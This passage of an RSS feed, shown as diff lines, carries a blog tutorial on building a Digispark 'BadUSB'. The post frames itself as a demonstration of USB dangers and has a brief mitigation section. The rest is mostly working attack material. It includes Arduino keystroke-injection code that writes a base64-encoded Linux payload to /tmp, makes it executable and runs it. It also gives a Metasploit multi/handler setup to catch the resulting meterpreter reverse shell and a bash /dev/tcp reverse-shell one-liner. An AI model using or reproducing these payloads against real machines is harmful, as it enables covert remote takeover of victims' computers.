+DigiKeyboard.print("f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAibAAAA4gAAAAcAAAAAEAAAMdv341NDU2oCsGaJ4c2Al1toCgAACGgCAANwieFqZlhQUVeJ4UPNgLIHuQAQAACJ48HrDMHjDLB9zYBbieGZtgywA82A/+E= | base64 --decode &amp;gt; /tmp/mShell");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+delay(500);
+// Change the permissions for the file...
+DigiKeyboard.println("chmod 755 /tmp/mShell");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+delay(200);
+// ...and execute it
+DigiKeyboard.println("/tmp/mShell");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+delay(100);
+// Payload executed!
+digitalWrite(1, LOW);
+}
+void loop() {
+// When scripts are done, blink some LED like it's 19
+digitalWrite(1, HIGH);
+delay(200);
+digitalWrite(1, LOW);
+delay(300);
+}
+</pre>
+<p>Now, it&#8217;s possible to check the code for errors from Arduino-IDE by clicking &#8220;<em>Sketch</em> =&gt; <em>Verify/Compile</em>&#8221; (or by pressing CTRL + R on the Arduino-IDE). If no errors found, the program is ready to be uploaded to Digispark by first clicking &#8220;<em>Sketch</em> =&gt;&nbsp;<em>Upload</em>&#8221; (or by pressing CTRL + U on the Arduino IDE) and you should get a following info on the bottom of the IDE window.<br />
+<a href="https://www.vesiluoma.com/wp-content/uploads/2017/02/ArduinoIDE-upload.png"><img decoding="async" class=" wp-image-747 aligncenter" src="https://www.vesiluoma.com/wp-content/uploads/2017/02/ArduinoIDE-upload.png" alt="" width="505" height="96"></a><br />
+Now the Digispark can be inserted to a USB port on the computer. After a while, the update should go through and you should see following info.<br />
+<a href="https://www.vesiluoma.com/wp-content/uploads/2017/02/ArduinoIDE-uploaded.png"><img decoding="async" class="size-full wp-image-748 aligncenter" src="https://www.vesiluoma.com/wp-content/uploads/2017/02/ArduinoIDE-uploaded.png" alt="" width="253" height="105"></a><br />
+The programming of the Digispark is now ready and it now is a &#8216;BadUSB&#8217;.<br />
+Note: I had some problems with the uploading. Sometimes it takes a few tries to get a succesful program upload to Digispark, don&#8217;t yet know why..</p>
+<h2>0x04 Metasploit, multi/handler</h2>
+<p>Now multi/handler is setup to catch the meterpreter shell.&nbsp;Payload is &#8220;<em>linux/x86/meterpreter/reverse_tcp</em>&#8220;, since the generated payload<br />
+The whole point of this is guide is to demonstrate how dangerous it is to plug in USB sticks. Keep in mind that normal USB stick firmwares can also be reprogrammed like this and it doesn&#8217;t necessary help that they are formatted.<br />
+multi/handler can simply be setup from the terminal with following command:</p>
+<pre>msfconsole -x "use multi/handler;\
+set PAYLOAD linux/x86/meterpreter/reverse_tcp;\
+set LHOST 10.0.0.8;\
+set LPORT 880;\
+set AutoRunScript multi_console_command -rc /root/autoruncommands.rc
+exploit"</pre>
+<p><a href="https://www.vesiluoma.com/wp-content/uploads/2017/02/meterpreter_ready_to_catch_the_fly.png"><img decoding="async" class=" wp-image-745 aligncenter" src="https://www.vesiluoma.com/wp-content/uploads/2017/02/meterpreter_ready_to_catch_the_fly.png" alt="" width="564" height="205"></a></p>
+<h2>0x05 The Exploitation</h2>
+<p><a href="https://www.vesiluoma.com/wp-content/uploads/2017/02/20170222_192405.jpg"><img decoding="async" class=" wp-image-751 aligncenter" src="https://www.vesiluoma.com/wp-content/uploads/2017/02/20170222_192405.jpg" alt="" width="494" height="287"></a><br />
+Now we are ready to test the BadUSB we have just created. When the Digispark / BadUSB is now inserted to linux computer, it should open the dashboard/search, open terminal, echo the Base64 encoded payload and decode it to file, change the executable bit for the payload file and run it. When the payload is run,&nbsp;multi/handler gets the shell. Here is a video recorded when the Digispark / BadUSB is inserted in to the linux computer. In the image above, you can see both LEDs from the Digispark are lighted, when the payload on the Digispark is executed.<br />
+Top right corner: syslog from &#8216;victim&#8217;, it&#8217;s visible when the BadUSB / Digispark is plugged in<br />
+Lower right corner: multi/handler from attacking server</p>
+<div class='avia-iframe-wrap'><iframe title="badUSB (Digispark) + meterpreter payload" width="1333" height="1000" src="https://www.youtube.com/embed/W-UPinvtevs?feature=oembed" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe></div>
+<h2>0x06 Mitigation</h2>
+<p>As for mitigation, for Windows, there is a program called &#8216;<a href="https://jlospinoso.github.io/infosec/usb%20rubber%20ducky/lan%20turtle/c%23/clr/wpf/.net/security/2016/11/30/beamgun-update-poison-tap.html"><em>Beamgun</em></a>&#8216; (haven&#8217;t tested it yet). Of course as for Windows, Linux, OSX you could always disable USB ports, create scripts that prevent adding new hardware etc., but if you really need USB devices, that would be pretty cumbersome in the long run. And of course&#8230;don&#8217;t plug untrusted devices to your computer and don&#8217;t let anybody plug unknown USB devices to your computer. There is also a physical, small box called &#8216;<a href="http://www.usbguard.fi/">USBguard</a>&#8216; (also not tested in this experiment), that should block these kinds of attacks.</p>
+<h2>0x07 Conclusion</h2>
+<p>BadUSB stick could also be created with a normal USB drive (e.g. &#8216;Rubber ducky&#8217; from Hak5) and this shows how bad effects plugging &#8216;found&#8217; USB stick can have. Payload could also be something more nasty, e.g. wipe the whole drive from the computer.<br />
+It&#8217;s also possible to create payloads for Windows and OSX. For OSX, you can get a shell using for example following payload after you have launched a shell:</p>
+<pre>DigiKeyboard.print("/bin/bash -i &gt; /dev/tcp/10.0.0.8/880 0&lt;&amp;1 2&gt;1");</pre>
+<p>I&#8217;ll post example codes for Windows and OSX also when I have time to tinker some more.</p>
+<p>(Original article:&nbsp;<a href="https://www.vesiluoma.com/exploiting-with-badusb-meterpreter-digispark/">https://www.vesiluoma.com/exploiting-with-badusb-meterpreter-digispark/</a> )</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>/exploiting-with-badusbdigispark-meterpreter-payload/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+	</channel>
+</rss>
